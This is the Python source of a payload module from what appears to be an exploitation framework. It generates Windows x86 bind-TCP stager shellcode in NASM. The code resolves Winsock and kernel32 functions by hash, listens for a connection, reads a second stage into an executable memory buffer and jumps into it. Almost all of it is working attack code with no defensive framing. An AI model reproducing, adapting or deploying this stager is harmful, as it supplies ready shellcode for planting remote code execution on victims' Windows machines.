import struct
from collections.abc import Mapping, Sequence

from teralibs.tsf.core.module.base import Base
from teralibs.tsf.core.payload.windows.x86.block_api_x86 import BlockApiX86
from teralibs.tsf.core.payload.windows.x86.exitfunk_x86 import ExitfunkX86
from teralibs.tsf.pex.terasm.api import Terasm


class BindTcpX86(Base):
    """Windows x86 bind-TCP stager."""

    OPTIONS: Sequence = ["RHOST", "LPORT", "EXITFUNC"]
    STAGER_CONF: Mapping = {}

    # Corrected size values to match standard Windows x86 stager bounds
    CACHED_SIZE: int
    AVAILABLE_SPACE: int | None = None

    def __init__(self):
        self.exitfunk = ExitfunkX86()
        self.blockapi = BlockApiX86()

    def use_ipv6(self) -> bool:
        """By default, we use IPv4, but this can be overridden for certain payloads if requested."""
        return False

    def required_space(self) -> int:
        """Determine the maximum amount of space required for the features requested."""
        space = self.CACHED_SIZE

        # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
        space += 31

        # EXITFUNK unset will still call ExitProces, which adds 7 bytes (accounted for above)

        # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
        space += 14

        return space

    def generate(self, ctx) -> bytes:
        """Simulates the core entry step to prepare options before full assembly generation."""
        conf = {"port": int(ctx.get_option("LPORT")), "reliable": False}

        available_space = getattr(ctx, "available_space", None) or self.AVAILABLE_SPACE
        if available_space is not None and self.CACHED_SIZE and self.required_space() <= available_space:
            conf["exitfunk"] = ctx.get_option("EXITFUNC")
            conf["reliable"] = True

        return Terasm("x86", 32, "nasm").assemble(self.generate_bind_tcp(conf), addr=0x1000)

    def generate_bind_tcp(self, opts: dict) -> str:
        """Generates the NASM code for the bind-TCP stager based on the provided configuration."""
        asm = f"""
            cld                                 ; Clear the direction flag.
            call start                          ; Call start, this pushes the address of 'api_call' onto the stack.
            {self.blockapi.asm_block_api()}
            start:
                pop ebp
            {self.asm_bind_tcp(opts)}
            {self.asm_block_recv(opts)}
        """

        return asm

    def asm_bind_tcp(self, opts: dict) -> str:
        """Generates the NASM code for the bind-TCP connection setup."""
        reliable = opts.get("reliable", False)

        port = int(opts["port"])
        addr_fam = 2
        sockaddr_size = 16

        if self.use_ipv6():
            addr_fam = 23
            sockaddr_size = 28

        encoded_port = f"0x{struct.unpack('>I', struct.pack('<H', port) + struct.pack('>H', addr_fam))[0]:08x}"

        asm = f"""
            ; Input: EBP must be the address of 'api_call'.
            ; Output: EDI will be the newly connected clients socket
            ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

            bind_tcp:
                push 0x00003233                 ; Push the bytes 'ws2_32',0,0 onto the stack.
                push 0x5F327377                 ; ...
                push esp                        ; Push a pointer to the "ws2_32" string on the stack.

                push {self.blockapi.block_api_hash("kernel32.dll", "LoadLibraryA")}

                call ebp                        ; LoadLibraryA( "ws2_32" )
                mov eax, 0x0190                 ; EAX = sizeof( struct WSAData )
                sub esp, eax                    ; alloc some space for the WSAData structure
                push esp                        ; push a pointer to this struct
                push eax                        ; push the wVersionRequested parameter

                push {self.blockapi.block_api_hash("ws2_32.dll", "WSAStartup")}

                call ebp                        ; WSAStartup( 0x0190, &WSAData );
                push 0x{11:08x}
                pop ecx

            push_0_loop:
                push eax                        ; if we succeed, eax will be zero, push it enough times
                                                ; to cater for both IPv4 and IPv6
                loop push_0_loop

                ; push zero for the flags param [8]
                ; push null for reserved parameter [7]
                ; we do not specify a WSAPROTOCOL_INFO structure [6]
                ; we do not specify a protocol [5]

                push 0x{1:08x}                  ; push SOCK_STREAM
                push 0x{addr_fam:08x}           ; push AF_INET/6

                push {self.blockapi.block_api_hash("ws2_32.dll", "WSASocketA")}

                call ebp                        ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
                xchg edi, eax                   ; save the socket for later, don't care about the value of eax after this

                ; bind to 0.0.0.0/[::], pushed earlier

                push {encoded_port}             ; family AF_INET and port number
                mov esi, esp                    ; save a pointer to sockaddr_in struct
                push 0x{sockaddr_size:08x}      ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
                push esi                        ; pointer to the sockaddr_in struct
                push edi                        ; socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "bind")}

                call ebp                        ; bind( s, &sockaddr_in, 16 );
        """

        if reliable:
            asm += """
                test eax,eax
                jnz failure
            """

        asm += f"""
                ; backlog, pushed earlier [3]

                push edi                        ; socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "listen")}

                call ebp                        ; listen( s, 0 );

                ; we set length for the sockaddr struct to zero, pushed earlier [2]
                ; we dont set the optional sockaddr param, pushed earlier [1]

                push edi                        ; listening socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "accept")}

                call ebp                        ; accept( s, 0, 0 );
                push edi                        ; push the listening socket
                xchg edi, eax                   ; replace the listening socket with the new connected socket for further comms

                push {self.blockapi.block_api_hash("ws2_32.dll", "closesocket")}

                call ebp                        ; closesocket( s );
        """

        return asm

    def asm_block_recv(self, opts: dict) -> str:
        """
        Generate an assembly stub with the configured feature set and options.
        """
        reliable = opts.get("reliable", False)

        asm = f"""
            recv:

                ; Receive the size of the incoming second stage...

                push 0                          ; flags
                push 0x{4:08x}                  ; length = sizeof( DWORD );
                push esi                        ; the 4 byte buffer on the stack to hold the second stage length
                push edi                        ; the saved socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call ebp                        ; recv( s, &dwLength, 4, 0 );
        """

        if reliable:
            asm += """
                cmp eax, 0
                jle failure
            """

        asm += f"""
                ; Alloc a RWX buffer for the second stage

                mov esi, [esi]                  ; dereference the pointer to the second stage length
                push 0x40                       ; PAGE_EXECUTE_READWRITE
                push 0x1000                     ; MEM_COMMIT
                push esi                        ; push the newly received second stage length.
                push 0                          ; NULL as we dont care where the allocation is.

                push {self.blockapi.block_api_hash("kernel32.dll", "VirtualAlloc")}

                call ebp                        ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

                ; Receive the second stage and execute it...

                xchg ebx, eax                   ; ebx = our new memory address for the new stage
                push ebx                        ; push the address of the new stage so we can return into it

            read_more:
                push 0                          ; flags
                push esi                        ; length
                push ebx                        ; the current address into our second stage's RWX buffer
                push edi                        ; the saved socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call ebp                        ; recv( s, buffer, length, 0 );
        """

        if reliable:
            asm += """
                cmp eax, 0
                jle failure
            """

        asm += """
                add ebx, eax                    ; buffer += bytes_received
                sub esi, eax                    ; length -= bytes_received, will set flags
                jnz read_more                   ; continue if we have more to read
                ret                             ; return into the second stage
        """

        if reliable:
            if opts.get("exitfunk"):
                asm += """
            failure:
                """
                asm += self.exitfunk.asm_exitfunk(opts, self.blockapi.block_api_hash)
            else:
                asm += f"""
            failure:
                push {self.blockapi.block_api_hash("kernel32.dll", "ExitProcess")}
                call ebp
                """

        return asm
